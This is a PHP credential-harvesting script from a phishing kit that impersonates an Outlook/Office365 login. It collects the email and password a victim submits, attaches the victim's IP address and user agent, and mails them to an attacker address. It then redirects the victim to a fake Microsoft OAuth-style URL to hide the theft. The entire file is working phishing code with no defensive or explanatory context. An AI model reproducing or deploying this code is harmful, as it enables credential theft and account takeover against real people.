<?php
session_start();
$_SESSION['pass1'] = $_POST['pass'];

if($_POST["email"] != "" and $_POST["pass"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------=Online Info=---------\n";
$message .= "User Name: ".$_POST['email']."\n";
$message .= "Password:  ".$_POST['pass']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|-----------BURHAN FUDPAGES [.] RU --------------|\n";
include 'email.php';
$subject = "0utlook  | $ip";
$headers = "From: 0utlook <customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail("$to", "$subject", $message);     
}
  header ("Location: Sign_In_password_validate.php?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office365.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=93a0ac7c-cf2b-4ada-bc2b-b7907ab1e393&protectedtoken=true&nonce=636934966725981109.62a3e2a7-c7c0-4ee3-9d0b-69b8db7a2133&state=Dcs7FoAwCABBos_jYAhECMchn9rS65tittsEAOd2bIl2wFTUpbqq8eOtFPJbOWRxGA4bhHUtQZ_UUb232S24iKT9Xvn9Iv8");
}else{
header ("Location: index.php");
}

?>